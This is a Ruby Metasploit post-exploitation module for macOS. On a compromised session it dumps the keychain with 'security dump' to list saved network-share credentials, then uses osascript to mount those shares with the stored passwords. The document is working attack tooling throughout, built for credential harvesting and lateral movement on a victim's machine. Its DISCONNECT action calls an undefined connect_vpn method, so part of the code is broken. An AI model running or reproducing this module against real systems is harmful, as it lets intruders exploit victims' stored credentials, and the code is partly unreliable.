##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Network Share Mounter',
        'Description'   => %q{
          This module lists saved network shares and tries to connect to them using stored credentials.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',     { 'Description' => 'Show a list of stored network share credentials' } ],
          [ 'CONNECT', { 'Description' => 'Connect to a network share using stored credentials' } ],
          [ 'DISCONNECT', { 'Description' => 'Disconnect a mounted volume' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('SHARE', [true, 'Name of network share connection. `set ACTION LIST` to get a list.', 'localhost']),
        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
        OptString.new('PROTOCOL', [true, 'Network share protocol. `set ACTION LIST` to get a list.', 'smb'])
      ], self.class)

  end

  def run
    fail_with("Invalid action") if action.nil?

    if action.name == 'LIST'
      data = get_share_list()
      if data.length == 0
        print_status("No Network Share credentials were found in the keyrings")
      else
        print_status("Protocol\tShare Name")
        data.each do |line|
          print_good(line)
        end
      end
    elsif action.name == 'CONNECT'
      connect()
    elsif action.name == 'DISCONNECT'
      connect_vpn(false)
    end
  end

  def get_share_list()
    vprint_status(datastore['SECURITY_PATH'].shellescape + " dump")
    data = cmd_exec(datastore['SECURITY_PATH'].shellescape + " dump")
    # Grep for desc srvr and ptcl
    tmp = Array.new()
    data.split("\n").each do |line|
      unless line !~ /desc|srvr|ptcl/
        tmp.push(line)
      end
    end
    # Go through the list, find the saved Network Password descriptions
    # and their corresponding ptcl and srvr attributes
    list = Array.new()
    for x in 0..tmp.length-1
      if tmp[x] =~ /"desc"<blob>="Network Password"/
        protocol = tmp[x+1].gsub(/^.*\=\"/, '').gsub(/\w*\"\w*$/, '')
        server = tmp[x+2].gsub(/^.*\=\"/, '').gsub(/\"\w*$/, '')
        list.push(protocol + "\t" + server)
      end
    end
    return list.sort
  end

  def connect()
    share_name = datastore['SHARE'].shellescape
    protocol = datastore['PROTOCOL'].shellescape
    print_status("Connecting to #{protocol}://#{share_name}")
    cmd = "osascript -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'"
    vprint_status(cmd)
    cmd_exec(cmd)
  end
end
